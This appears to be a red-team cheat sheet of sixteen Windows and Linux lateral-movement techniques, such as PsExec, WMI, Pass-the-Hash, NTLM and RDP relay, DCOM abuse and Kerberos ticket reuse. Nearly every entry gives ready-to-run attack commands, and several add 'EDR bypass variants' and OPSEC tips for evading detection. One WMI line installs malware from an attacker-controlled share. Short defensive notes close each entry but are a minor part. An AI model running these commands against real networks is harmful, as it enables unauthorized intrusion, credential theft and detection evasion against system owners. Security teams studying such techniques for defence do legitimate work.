# Lateral Movement

_16 intranet payloads_

### PsExec Lateral Movement  `lateral-psexec`
_Lateral movement using PsExec_
Subcategory: **SMB** · tags: `psexec` `lateral` `smb` `windows`

**Prerequisites:**
- Target machine has port 445 open
- Possess administrator credentials for the target machine
- ADMIN$ share is accessible

**Attack chain:**

**Basic usage**
> Connect to the target using Impacket's psexec.py
_platform: linux_
```
psexec.py domain/user:password@target_ip
```
**Syntax breakdown:**
- `psexec.py` — Impacket tool that implements PsExec functionality _command_
- `domain/user:password` — Authentication credential format _value_
- `@target_ip` — Target IP address _value_

**Connect using hash**
> Use NTLM hash for Pass-the-Hash
_platform: linux_
```
psexec.py -hashes :NTLM_HASH domain/user@target_ip
```
**Syntax breakdown:**
- `-hashes` — Specify hash authentication _parameter_
- `:NTLM_HASH` — NTLM hash value (LM:NTLM format, LM left empty) _value_

**Execute command**
> Execute a command on the target machine
_platform: linux_
```
psexec.py domain/user:password@target_ip "whoami"
```

**Windows PsExec**
> Use Sysinternals PsExec
_platform: windows_
```
PsExec.exe \\target_ip -u domain\user -p password cmd.exe
```
**Syntax breakdown:**
- `\\target_ip` — Target machine IP _value_
- `-u` — Specify username _parameter_
- `-p` — Specify password _parameter_

**EDR bypass variants:**

**Custom service name**
> Use a custom service name to avoid detection
```
psexec.py -service-name CustomService domain/user:password@target_ip
```

**SMBExec alternative**
> Use smbexec.py, no disk writes
```
smbexec.py domain/user:password@target_ip
```

**Analysis:** PsExec creates a service on the target machine via the SMB protocol and executes commands; upon success it grants a shell on the target machine.

**OPSEC tips:**
- PsExec creates a service on the target machine, which is easily detected
- Service names and binary files may trigger alerts
- Consider using a stealthier lateral movement method

**Overview:** PsExec is a tool from the Sysinternals suite that allows processes to be executed on a remote machine. Attackers commonly use it for lateral movement.

**Vulnerability principle:** PsExec leverages the SMB protocol and the Windows service mechanism, uploading an executable via the ADMIN$ share and creating a service to execute it.

**Exploitation method:** Exploitation flow: 1) Obtain target machine credentials; 2) Connect to the target via SMB; 3) Upload the executable to ADMIN$; 4) Create and start a service; 5) Obtain a remote shell.

**Defensive measures:** Defensive measures: 1) Disable the ADMIN$ share; 2) Restrict SMB access; 3) Monitor service creation; 4) Deploy EDR to detect anomalous behavior.

---

### WMI Lateral Movement  `lateral-wmi`
_Lateral movement using WMI_
Subcategory: **WMI** · tags: `wmi` `lateral` `windows` `remote`

**Prerequisites:**
- Target machine has port 135 open
- Possess administrator credentials for the target machine
- WMI service is accessible

**Attack chain:**

**WMI command execution**
> Use WMIC to remotely execute commands
_platform: windows_
```
wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
```
**Syntax breakdown:**
- `wmic` — Windows Management Instrumentation command-line tool _command_
- `/node:` — Specify the target machine _parameter_
- `/user:` — Specify username _parameter_
- `process call create` — Invoke the create-process method _command_

**Impacket wmiexec**
> Use Impacket's wmiexec.py
_platform: linux_
```
wmiexec.py domain/user:password@target_ip
```
**Syntax breakdown:**
- `wmiexec.py` — Impacket WMI execution tool _command_

**Using hash**
> Pass-the-Hash via WMI
_platform: linux_
```
wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
```

**PowerShell WMI**
> Use PowerShell WMI
_platform: windows_
```
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
```
**Syntax breakdown:**
- `Invoke-WmiMethod` — PowerShell WMI method invocation _command_
- `Win32_Process` — WMI process class _value_
- `-ComputerName` — Target computer name _parameter_

**EDR bypass variants:**

**WMI event subscription**
> Install an MSI package via WMI to execute code
```
wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
```

**Analysis:** WMI lateral movement does not create a service on the target machine, making it stealthier than PsExec.

**OPSEC tips:**
- WMI execution leaves no obvious file traces
- However, WMI activity may be monitored
- Command output is retrieved via a temporary file

**Overview:** WMI (Windows Management Instrumentation) is a core component of the Windows management framework and can be used for remote management and command execution.

**Vulnerability principle:** WMI allows administrators to remotely manage Windows systems; attackers can leverage this functionality to execute commands and move laterally.

**Exploitation method:** Exploitation flow: 1) Obtain target credentials; 2) Connect to the target via WMI; 3) Invoke Win32_Process to create a process; 4) Execute the command and retrieve results.

**Defensive measures:** Defensive measures: 1) Restrict WMI remote access; 2) Monitor WMI activity; 3) Deploy EDR to detect anomalous WMI calls; 4) Use a firewall to restrict port 135.

---

### Pass-the-Hash Attack  `pass-the-hash`
_Authentication using NTLM hashes_
Subcategory: **Authentication Attack** · tags: `pth` `ntlm` `hash` `authentication`

**Prerequisites:**
- Obtain the user's NTLM hash
- Target machine allows NTLM authentication
- Target machine has SMB/WMI ports open

**Attack chain:**

**Impacket PtH**
> Perform PtH using Impacket
_platform: linux_
```
psexec.py -hashes :NTHASH domain/user@target_ip
```
**Syntax breakdown:**
- `-hashes` — Specify hash authentication _parameter_
- `:NTHASH` — NTLM hash (LM:NTLM format) _value_

**CrackMapExec PtH**
> Perform PtH using CrackMapExec
_platform: linux_
```
crackmapexec smb target_ip -u user -H NTHASH -d domain
```
**Syntax breakdown:**
- `crackmapexec smb` — CrackMapExec SMB module _command_
- `-H` — Specify NTLM hash _parameter_

**Windows PtH**
> Perform PtH using Mimikatz
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
```

**PowerShell PtH**
> Perform PtH using PowerShell
_platform: windows_
```
Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
```

**EDR bypass variants:**

**Overpass-the-Hash**
> Convert the hash into a Kerberos ticket
```
sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
```

**Analysis:** After a successful PtH, you can access the target machine as that user without a plaintext password.

**OPSEC tips:**
- PtH does not produce password verification in login logs
- However, it leaves network logon logs
- Pay attention to timestamps and source IP

**Overview:** Pass-the-Hash is an attack technique that uses NTLM hashes for authentication; an attacker can authenticate without knowing the plaintext password.

**Vulnerability principle:** The NTLM authentication mechanism allows authentication using the password hash; once the hash is leaked, an attacker can impersonate the user.

**Exploitation method:** Exploitation flow: 1) Obtain the user's NTLM hash; 2) Perform PtH using a tool; 3) Gain access to the target machine; 4) Carry out follow-up attacks.

**Defensive measures:** Defensive measures: 1) Restrict NTLM authentication; 2) Enable Kerberos; 3) Monitor anomalous logons; 4) Use Restricted Admin mode.

---

### NTLM Relay Attack  `ntlm-relay`
_NTLM relay attack technique_
Subcategory: **Authentication Attack** · tags: `ntlm` `relay` `smb` `authentication`

**Prerequisites:**
- Target machine has the SMB port open
- Target machine does not have SMB signing enabled
- Able to induce the target machine to authenticate

**Attack chain:**

**Responder listening**
> Start Responder to listen for NTLM authentication
_platform: linux_
```
responder -I eth0 -wrf
```
**Syntax breakdown:**
- `responder` — NTLM/LLMNR/NBT-NS spoofing tool _command_
- `-I` — Specify network interface _parameter_
- `-wrf` — Enable WPAD, Finger, and FTP services _parameter_

**ntlmrelayx attack**
> Perform a relay attack using ntlmrelayx
_platform: linux_
```
ntlmrelayx.py -tf targets.txt -smb2support
```
**Syntax breakdown:**
- `ntlmrelayx.py` — Impacket NTLM relay tool _command_
- `-tf` — Target file _parameter_
- `-smb2support` — Support the SMB2 protocol _parameter_

**Relay to LDAP**
> Relay to LDAP for privilege escalation
_platform: linux_
```
ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
```

**IPv6 relay**
> Perform NTLM relay using IPv6
_platform: linux_
```
mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
```

**EDR bypass variants:**

**Drop the MIC**
> Remove the MIC flag to bypass signature verification
```
ntlmrelayx.py -t smb://target --remove-mic
```

**Analysis:** After a successful NTLM Relay, you can gain access to the target machine or escalate domain privileges.

**OPSEC tips:**
- Requires the target machine to not have SMB signing enabled
- Domain controllers enable signing by default
- IPv6 relay is stealthier

**Overview:** NTLM Relay is a man-in-the-middle attack in which the attacker relays captured NTLM authentication to another service to achieve identity impersonation.

**Vulnerability principle:** The NTLM protocol itself has a design flaw that permits relay attacks. If the target server does not have signature verification enabled, the attacker can impersonate the victim's identity.

**Exploitation method:** Exploitation flow: 1) Start Responder or ntlmrelayx to listen; 2) Induce the target machine to initiate authentication; 3) Relay the authentication to the target service; 4) Gain access or perform operations.

**Defensive measures:** Defensive measures: 1) Enable SMB signing; 2) Disable NTLM authentication; 3) Enable Extended Protection for Authentication; 4) Monitor anomalous authentication behavior.

---

### WinRM Lateral Movement  `lateral-winrm`
_Lateral movement via WinRM_
Subcategory: **WinRM** · tags: `winrm` `lateral` `powershell`

**Prerequisites:**
- WinRM enabled
- Valid credentials

**Attack chain:**

**PowerShell remoting**
> PowerShell remote session
_platform: windows_
```
Enter-PSSession -ComputerName target -Credential $cred
```
**Syntax breakdown:**
- `Enter-PSSession` — Enter a remote PowerShell session _command_
- `-ComputerName target` — Target computer name _parameter_
- `-Credential $cred` — Credential object _parameter_

**Execute command**
> Remotely execute a command
_platform: windows_
```
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
```

**evil-winrm**
> Connect using evil-winrm
_platform: linux_
```
evil-winrm -i target -u user -p password
```

**Overview:** WinRM is the Windows Remote Management protocol and can be used for lateral movement.

**Vulnerability principle:** WinRM is enabled by default and accepts plaintext credentials.

**Exploitation method:** Exploitation flow: 1) Confirm WinRM is enabled 2) Connect using valid credentials

**Defensive measures:** Defensive measures: 1) Restrict WinRM access 2) Use certificate authentication 3) Monitor logs

---

### DCOM Lateral Movement  `lateral-dcom`
_Lateral movement via DCOM_
Subcategory: **DCOM** · tags: `dcom` `lateral` `com`

**Prerequisites:**
- DCOM enabled
- Valid credentials

**Attack chain:**

**MMC20.Application**
> Execute a command via MMC DCOM
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
```
**Syntax breakdown:**
- `MMC20.Application` — MMC COM object _value_
- `ExecuteShellCommand` — Method that executes a shell command _function_
- `"7"` — Window state parameter _value_

**ShellBrowserWindow**
> Execute via ShellBrowserWindow
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
```

**Excel DCOM**
> Execute via Excel DCOM
_platform: windows_
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd","/c calc.exe")
```

**Overview:** DCOM allows COM objects to be created remotely and code to be executed.

**Vulnerability principle:** Certain COM objects allow system commands to be executed.

**Exploitation method:** Exploitation flow: 1) Enumerate available COM objects 2) Create the instance remotely 3) Execute the command

**Defensive measures:** Defensive measures: 1) Restrict DCOM remote access 2) Disable dangerous COM objects

---

### SSH Lateral Movement  `lateral-ssh`
_Lateral movement via SSH_
Subcategory: **SSH** · tags: `ssh` `lateral` `linux`

**Prerequisites:**
- SSH service
- Valid credentials

**Attack chain:**

**SSH connection**
> Basic SSH connection
_platform: linux_
```
ssh user@target
```

**SSH key authentication**
> Connect using a private key
_platform: linux_
```
ssh -i private_key user@target
```
**Syntax breakdown:**
- `-i private_key` — Specify the private key file _parameter_
- `user@target` — Username and target address _value_

**SSH jump host**
> Connect through a jump host
_platform: linux_
```
ssh -J jump_host user@target
```

**Overview:** SSH is a remote management protocol commonly used in Linux environments.

**Vulnerability principle:** Weak passwords, key leakage, misconfiguration.

**Exploitation method:** Exploitation flow: 1) Discover the SSH service 2) Try credentials 3) Connect and execute

**Defensive measures:** Defensive measures: 1) Disable password authentication 2) Use keys 3) Restrict users

---

### RDP Session Hijacking  `rdp-hijack`
_Hijack an existing RDP session_
Subcategory: **RDP** · tags: `rdp` `hijack` `session`

**Prerequisites:**
- SYSTEM privileges
- An RDP session exists

**Attack chain:**

**List sessions**
> List all user sessions
_platform: windows_
```
query user
```

**Hijack session**
> Hijack a specified session
_platform: windows_
```
tscon SESSION_ID /dest:console
```
**Syntax breakdown:**
- `tscon` — Terminal Services connection command _command_
- `SESSION_ID` — Target session ID _variable_
- `/dest:console` — Connect to the current console _parameter_

**Using Mimikatz**
> Hijack using Mimikatz
_platform: windows_
```
ts::sessions
ts::remote /id:SESSION_ID
```

**Overview:** RDP session hijacking can take over another user's desktop session.

**Vulnerability principle:** SYSTEM privileges can connect to any session.

**Exploitation method:** Exploitation flow: 1) Obtain SYSTEM privileges 2) List sessions 3) Hijack the session

**Defensive measures:** Defensive measures: 1) Restrict local logon 2) Monitor session connections 3) Use a lock-screen policy

---

### Overpass-the-Hash  `overpass-the-hash`
_Use a hash to obtain a Kerberos ticket_
Subcategory: **PtH** · tags: `pth` `kerberos` `hash`

**Prerequisites:**
- User NTLM hash
- Domain environment

**Attack chain:**

**Mimikatz**
> Use a hash to obtain a Kerberos ticket
_platform: windows_
```
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
```
**Syntax breakdown:**
- `sekurlsa::pth` — Pass-the-Hash module _command_
- `/ntlm:HASH` — User NTLM hash _parameter_
- `/ptt` — Pass-the-Ticket, inject the ticket _parameter_

**Rubeus**
> Obtain a ticket using Rubeus
_platform: windows_
```
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
```

**Impacket**
> Obtain a Kerberos ticket
_platform: linux_
```
getTGT.py domain.com/user -hashes :HASH
```

**Overview:** Overpass-the-Hash uses the NTLM hash to obtain a Kerberos ticket.

**Vulnerability principle:** Kerberos can use the NTLM hash to obtain a TGT.

**Exploitation method:** Exploitation flow: 1) Obtain the user's hash 2) Request a Kerberos ticket 3) Inject and use it

**Defensive measures:** Defensive measures: 1) Monitor anomalous ticket requests 2) Use smart cards 3) Restrict hash access

---

### Pass-the-Ticket  `pass-the-ticket`
_Lateral movement using a Kerberos ticket_
Subcategory: **PtT** · tags: `ptt` `kerberos` `ticket`

**Prerequisites:**
- Valid Kerberos ticket

**Attack chain:**

**Export ticket**
> Export a Kerberos ticket from memory
_platform: windows_
```
sekurlsa::tickets /export
```

**Inject ticket**
> Inject a ticket into the current session
_platform: windows_
```
kerberos::ptt ticket.kirbi
```
**Syntax breakdown:**
- `kerberos::ptt` — Pass-the-Ticket module _command_
- `ticket.kirbi` — Kerberos ticket file _path_

**Rubeus import**
> Inject a ticket using Rubeus
_platform: windows_
```
Rubeus.exe ptt /ticket:base64ticket
```

**Overview:** Kerberos tickets can be extracted and reused.

**Vulnerability principle:** A Kerberos ticket can be reused within its validity period.

**Exploitation method:** Exploitation flow: 1) Extract the ticket 2) Transfer the ticket 3) Inject and use it

**Defensive measures:** Defensive measures: 1) Shorten the ticket validity period 2) Monitor ticket usage 3) Use PAC validation

---

### SMBExec Lateral Movement  `lateral-smbexec`
_Execute commands via SMB_
Subcategory: **SMB** · tags: `smb` `lateral` `exec`

**Prerequisites:**
- SMB access
- Administrator privileges

**Attack chain:**

**Impacket smbexec**
> Execute commands using smbexec
_platform: linux_
```
smbexec.py domain/user:password@target
```

**Execute via service**
> Create and start a service
_platform: windows_
```
sc \\target create evilsvc binPath= "cmd /c whoami"
sc \\target start evilsvc
sc \\target delete evilsvc
```
**Syntax breakdown:**
- `sc \\target` — Remote service control _domain_
- `create evilsvc` — Create a service _keyword_
- `binPath=` — Service execution path _parameter_

**Overview:** SMBExec creates a service via SMB to execute commands.

**Vulnerability principle:** SMB allows remote service management.

**Exploitation method:** Exploitation flow: 1) Connect via SMB 2) Create a service 3) Execute the command

**Defensive measures:** Defensive measures: 1) Disable SMB 2) Restrict remote service creation 3) Monitor service logs

---

### ATExec Lateral Movement  `lateral-atexec`
_Execute commands via scheduled tasks_
Subcategory: **Scheduled Task** · tags: `at` `scheduled` `lateral`

**Prerequisites:**
- Scheduled task privileges
- Administrator privileges

**Attack chain:**

**Impacket atexec**
> Execute commands using atexec
_platform: linux_
```
atexec.py domain/user:password@target "whoami"
```

**schtasks**
> Create a remote scheduled task
_platform: windows_
```
schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
```
**Syntax breakdown:**
- `/s target` — Target computer _parameter_
- `/tn "evil"` — Task name _parameter_
- `/tr` — Program the task executes _parameter_
- `/sc once` — Execute once _parameter_

**Overview:** ATExec executes commands via scheduled tasks.

**Vulnerability principle:** Scheduled tasks allow remote creation and execution.

**Exploitation method:** Exploitation flow: 1) Connect to the target 2) Create a task 3) Execute the command

**Defensive measures:** Defensive measures: 1) Restrict remote task creation 2) Monitor task logs

---

### WinRS Lateral Movement  `lateral-winrs`
_Execute remote commands via WinRS_
Subcategory: **WinRS** · tags: `winrs` `lateral` `windows`

**Prerequisites:**
- WinRM enabled
- Valid credentials

**Attack chain:**

**Execute command**
> Remotely execute a command
_platform: windows_
```
winrs -r:target -u:user -p:password "whoami"
```
**Syntax breakdown:**
- `-r:target` — Remote target _parameter_
- `-u:user` — Username _parameter_
- `-p:password` — Password _parameter_

**Get shell**
> Obtain a remote CMD
_platform: windows_
```
winrs -r:target -u:user -p:password "cmd"
```

**Overview:** WinRS is the Windows Remote Shell tool, based on WinRM.

**Vulnerability principle:** When WinRM is enabled, commands can be executed via WinRS.

**Exploitation method:** Exploitation flow: 1) Confirm WinRM is enabled 2) Connect using credentials 3) Execute the command

**Defensive measures:** Defensive measures: 1) Restrict WinRM access 2) Monitor WinRM logs

---

### Excel DCOM Lateral Movement  `lateral-dcom-excel`
_Lateral movement leveraging Excel DCOM_
Subcategory: **DCOM** · tags: `dcom` `excel` `lateral`

**Prerequisites:**
- Excel installed on the target
- DCOM privileges

**Attack chain:**

**Excel DCOM activation**
> Activate the Excel DCOM object
_platform: windows_
```
$com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Visible = $false
```

**Execute command**
> Execute a command via Excel
_platform: windows_
```
$obj.Workbooks.Add()
$obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
$obj.Run("calc.exe")
```
**Syntax breakdown:**
- `Excel.Application` — Excel COM object _keyword_
- `=CMD|/C` — DDE command injection _keyword_

**Impacket DCOM**
> Execute using Impacket
_platform: linux_
```
python dcomexec.py -object Excel.Application domain/user:password@target.com
```

**Overview:** Excel DCOM can be used for remote command execution.

**Vulnerability principle:** The Excel DCOM object allows remote access.

**Exploitation method:** Exploitation flow: 1) Activate the DCOM object 2) Inject the command 3) Execute

**Defensive measures:** Defensive measures: 1) Disable DCOM 2) Restrict remote access 3) Monitor DCOM activity

---

### MMC DCOM Lateral Movement  `lateral-dcom-mmc`
_Lateral movement leveraging MMC DCOM_
Subcategory: **DCOM** · tags: `dcom` `mmc` `lateral`

**Prerequisites:**
- MMC installed on the target
- DCOM privileges

**Attack chain:**

**MMC20.Application**
> Execute a command using MMC
_platform: windows_
```
$com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
```
**Syntax breakdown:**
- `MMC20.Application` — MMC COM object _value_
- `ExecuteShellCommand` — Method that executes a shell command _function_

**Impacket execution**
> Use Impacket
_platform: linux_
```
python dcomexec.py -object MMC20.Application domain/user:password@target.com
```

**Overview:** MMC DCOM can be used for remote command execution.

**Vulnerability principle:** The MMC DCOM object allows remote access.

**Exploitation method:** Exploitation flow: 1) Activate MMC DCOM 2) Invoke ExecuteShellCommand 3) Execute the command

**Defensive measures:** Defensive measures: 1) Disable DCOM 2) Restrict remote access 3) Monitor DCOM activity

---

### RDP Relay Attack  `rdp-relay`
_RDP relay attack technique_
Subcategory: **RDP** · tags: `rdp` `relay` `lateral`

**Prerequisites:**
- RDP service is accessible
- NTLM authentication is present

**Attack chain:**

**Set up relay**
> Set up an RDP relay server
_platform: linux_
```
Using Impacket:
python ntlmrelayx.py -tf targets.txt -smb2support
Or use rdp_relay.py
```

**Induce connection**
> Induce a user to connect
```
Induce a user to connect to an attacker-controlled RDP server:
1. Send a malicious RDP file
2. Relay to the target when the user connects
```

**PetitPotam combination**
> PetitPotam + RDP Relay
_platform: linux_
```
python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
Combine with NTLM relay to attack ADCS
```

**Overview:** RDP Relay leverages NTLM authentication relay attacks.

**Vulnerability principle:** RDP uses NTLM authentication, which can be relayed.

**Exploitation method:** Exploitation flow: 1) Set up a relay server 2) Induce a connection 3) Relay the authentication

**Defensive measures:** Defensive measures: 1) Enable Kerberos 2) Enable CredSSP 3) Network isolation

---
